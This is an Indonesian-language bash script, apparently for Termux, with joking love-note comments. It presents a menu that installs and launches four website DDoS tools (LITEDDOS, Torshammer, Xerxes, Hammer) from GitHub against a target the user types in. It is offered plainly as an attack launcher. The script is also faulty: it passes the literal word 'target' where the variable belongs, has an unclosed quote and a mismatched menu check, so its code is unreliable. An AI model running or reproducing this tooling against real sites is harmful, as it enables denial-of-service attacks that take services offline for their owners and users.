#!/system/xbin/bash
#I LOVE GENDUT
#GUA PINGKYBOY
#GUA SUKA MA GENDUT 
#JADI JANGAN DEKETIN DIA 
#ATAU KAU AKAN KUTAPOK
#I LOVE YOU NDUT

clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'

echo $cyan"GENDUT I LOVE YOU"
echo $green"Daftar Toolsnya=>"
echo $purple"[1] DDOS Website Dengan LITEDDOS"
echo $purple"[2] DDOS Website Dengan 
Torshammer"
echo $purple"[3] DDOS Website Dengan Xerxes"
echo $purple"[4] DDOS Website Dengan Hammer"
echo
echo $green
read -p "?-[Pilih Nomer]
?-root@PINGKY=•>" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
echo $green"Installing LITEDDOS SU..."
sleep 1
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
echo $green"Lagi Install TOD
apt update
apt install git
git clone 
https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
read -p "Masukan Target:" target
python2 torshammer.py -T -t target
fi
if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
echo $green"Installing Xerxes DDOS..."
sleep 1
apt update && apt upgrade
apt install git
apt install clang
git clone https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
clang xerxes.c -o xerxes
clear
read -p "[masukanWebsiteTargetCok]>" target
./xerxes target 80
fi
if [ $bro = 4 ] || [ $bro = 5 ]
then
clear
echo $green" Installing Hammer DDOS.."
sleep 1
git clone https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
read -p "Masukan Targetmu su:" target
python2 hammer.py -T -t target
fi
THANKS
